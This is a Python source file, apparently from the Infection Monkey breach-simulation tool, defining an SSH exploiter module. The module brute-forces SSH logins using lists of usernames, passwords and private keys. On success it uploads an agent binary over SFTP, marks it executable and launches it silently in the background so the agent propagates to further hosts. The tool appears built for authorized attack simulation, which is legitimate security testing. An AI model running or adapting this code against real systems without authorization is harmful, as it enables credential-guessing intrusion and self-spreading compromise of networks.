import io
import logging
from pathlib import PurePath

import paramiko

from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT, MEDIUM_REQUEST_TIMEOUT
from common.utils import Timer
from common.utils.attack_utils import ScanStatus
from common.utils.exceptions import FailedExploitationError
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import MONKEY_ARG
from infection_monkey.network.tools import check_tcp_port, get_interface_to_target
from infection_monkey.telemetry.attack.t1105_telem import T1105Telem
from infection_monkey.telemetry.attack.t1222_telem import T1222Telem
from infection_monkey.utils.brute_force import generate_identity_secret_pairs
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)
SSH_PORT = 22
SSH_CONNECT_TIMEOUT = LONG_REQUEST_TIMEOUT
SSH_AUTH_TIMEOUT = LONG_REQUEST_TIMEOUT
SSH_BANNER_TIMEOUT = MEDIUM_REQUEST_TIMEOUT
SSH_EXEC_TIMEOUT = LONG_REQUEST_TIMEOUT
SSH_CHANNEL_TIMEOUT = MEDIUM_REQUEST_TIMEOUT

TRANSFER_UPDATE_RATE = 15


class SSHExploiter(HostExploiter):
    _EXPLOITED_SERVICE = "SSH"

    def __init__(self):
        super(SSHExploiter, self).__init__()

    def log_transfer(self, transferred, total):
        timer = Timer()
        timer.set(TRANSFER_UPDATE_RATE)

        if timer.is_expired():
            logger.debug("SFTP transferred: %d bytes, total: %d bytes", transferred, total)
            timer.reset()

    def exploit_with_ssh_keys(self, port) -> paramiko.SSHClient:
        user_ssh_key_pairs = generate_identity_secret_pairs(
            identities=self.options["credentials"]["exploit_user_list"],
            secrets=self.options["credentials"]["exploit_ssh_keys"],
        )

        ssh_key_pairs_iterator = interruptible_iter(
            user_ssh_key_pairs,
            self.interrupt,
            "SSH exploiter has been interrupted",
            logging.INFO,
        )

        for user, ssh_key_pair in ssh_key_pairs_iterator:
            # Creating file-like private key for paramiko
            pkey = io.StringIO(ssh_key_pair["private_key"])
            ssh_string = "%s@%s" % (user, self.host.ip_addr)

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
            try:
                pkey = paramiko.RSAKey.from_private_key(pkey)
            except (IOError, paramiko.SSHException, paramiko.PasswordRequiredException):
                logger.error("Failed reading ssh key")
            try:
                ssh.connect(
                    self.host.ip_addr,
                    username=user,
                    pkey=pkey,
                    port=port,
                    timeout=SSH_CONNECT_TIMEOUT,
                    auth_timeout=SSH_AUTH_TIMEOUT,
                    banner_timeout=SSH_BANNER_TIMEOUT,
                    channel_timeout=SSH_CHANNEL_TIMEOUT,
                )
                logger.debug(
                    "Successfully logged in %s using %s users private key", self.host, ssh_string
                )
                self.add_vuln_port(port)
                self.exploit_result.exploitation_success = True
                self.report_login_attempt(True, user, ssh_key=ssh_string)
                return ssh
            except paramiko.AuthenticationException as err:
                ssh.close()
                logger.info(
                    f"Failed logging into victim {self.host} with {ssh_string} private key: {err}",
                )
                self.report_login_attempt(False, user, ssh_key=ssh_string)
                continue
            except Exception as err:
                logger.error(f"Unknown error while attempting to login with ssh key: {err}")
        raise FailedExploitationError

    def exploit_with_login_creds(self, port) -> paramiko.SSHClient:
        user_password_pairs = generate_identity_secret_pairs(
            identities=self.options["credentials"]["exploit_user_list"],
            secrets=self.options["credentials"]["exploit_password_list"],
        )

        credentials_iterator = interruptible_iter(
            user_password_pairs,
            self.interrupt,
            "SSH exploiter has been interrupted",
            logging.INFO,
        )

        for user, current_password in credentials_iterator:

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
            try:
                ssh.connect(
                    self.host.ip_addr,
                    username=user,
                    password=current_password,
                    port=port,
                    timeout=SSH_CONNECT_TIMEOUT,
                    auth_timeout=SSH_AUTH_TIMEOUT,
                    banner_timeout=SSH_BANNER_TIMEOUT,
                    channel_timeout=SSH_CHANNEL_TIMEOUT,
                )

                logger.debug("Successfully logged in %r using SSH. User: %s", self.host, user)
                self.add_vuln_port(port)
                self.exploit_result.exploitation_success = True
                self.report_login_attempt(True, user, current_password)
                return ssh

            except paramiko.AuthenticationException as err:
                logger.debug(
                    "Failed logging into victim %r with user" " %s: (%s)",
                    self.host,
                    user,
                    err,
                )
                self.report_login_attempt(False, user, current_password)
                ssh.close()
                continue
            except Exception as err:
                logger.error(f"Unknown error occurred while trying to login to ssh: {err}")
        raise FailedExploitationError

    def _exploit_host(self) -> ExploiterResultData:
        port = SSH_PORT

        # if ssh banner found on different port, use that port.
        for servkey, servdata in list(self.host.services.items()):
            if servdata.get("name") == "ssh" and servkey.startswith("tcp-"):
                port = int(servkey.replace("tcp-", ""))

        is_open, _ = check_tcp_port(self.host.ip_addr, port)
        if not is_open:
            self.exploit_result.error_message = f"SSH port is closed on {self.host}, skipping"

            logger.info(self.exploit_result.error_message)
            return self.exploit_result

        try:
            ssh = self.exploit_with_ssh_keys(port)
        except FailedExploitationError:
            try:
                ssh = self.exploit_with_login_creds(port)
            except FailedExploitationError:
                self.exploit_result.error_message = "Exploiter SSHExploiter is giving up..."
                logger.error(self.exploit_result.error_message)
                return self.exploit_result

        if self._is_interrupted():
            self._set_interrupted()
            return self.exploit_result

        if not self.host.os.get("type"):
            try:
                _, stdout, _ = ssh.exec_command("uname -o", timeout=SSH_EXEC_TIMEOUT)
                uname_os = stdout.read().lower().strip().decode()
                if "linux" in uname_os:
                    self.exploit_result.os = "linux"
                else:
                    self.exploit_result.error_message = f"SSH Skipping unknown os: {uname_os}"

                    if not uname_os:
                        logger.error(self.exploit_result.error_message)
                    return self.exploit_result
            except Exception as exc:
                self.exploit_result.error_message = (
                    f"Error running uname os command on victim {self.host}: ({exc})"
                )

                logger.error(self.exploit_result.error_message)
                return self.exploit_result

        agent_binary_file_object = self.agent_binary_repository.get_agent_binary(
            self.exploit_result.os
        )

        if not agent_binary_file_object:
            self.exploit_result.error_message = (
                f"Can't find suitable monkey executable for host {self.host}"
            )

            logger.error(self.exploit_result.error_message)
            return self.exploit_result

        if self._is_interrupted():
            self._set_interrupted()
            return self.exploit_result

        monkey_path_on_victim = get_agent_dst_path(self.host)

        try:
            with ssh.open_sftp() as ftp:
                ftp.putfo(
                    agent_binary_file_object,
                    str(monkey_path_on_victim),
                    file_size=len(agent_binary_file_object.getbuffer()),
                    callback=self.log_transfer,
                )
                self._set_executable_bit_on_agent_binary(ftp, monkey_path_on_victim)

            status = ScanStatus.USED
        except Exception as exc:
            self.exploit_result.error_message = (
                f"Error uploading file into victim {self.host}: ({exc})"
            )
            logger.error(self.exploit_result.error_message)
            status = ScanStatus.SCANNED

        self.telemetry_messenger.send_telemetry(
            T1105Telem(
                status,
                get_interface_to_target(self.host.ip_addr),
                self.host.ip_addr,
                monkey_path_on_victim,
            )
        )
        if status == ScanStatus.SCANNED:
            return self.exploit_result

        try:
            cmdline = f"{monkey_path_on_victim} {MONKEY_ARG}"
            cmdline += build_monkey_commandline(self.host, self.current_depth + 1)
            cmdline += " > /dev/null 2>&1 &"
            ssh.exec_command(cmdline, timeout=SSH_EXEC_TIMEOUT)

            logger.info(
                "Executed monkey '%s' on remote victim %r (cmdline=%r)",
                monkey_path_on_victim,
                self.host,
                cmdline,
            )

            self.exploit_result.propagation_success = True

            ssh.close()
            self.add_executed_cmd(cmdline)
            return self.exploit_result

        except Exception as exc:
            self.exploit_result.error_message = (
                f"Error running monkey on victim {self.host}: ({exc})"
            )

            logger.error(self.exploit_result.error_message)
            return self.exploit_result

    def _set_executable_bit_on_agent_binary(
        self, ftp: paramiko.sftp_client.SFTPClient, monkey_path_on_victim: PurePath
    ):
        ftp.chmod(str(monkey_path_on_victim), 0o700)
        self.telemetry_messenger.send_telemetry(
            T1222Telem(
                ScanStatus.USED,
                "chmod 0700 {monkey_path_on_victim}",
                self.host,
            )
        )
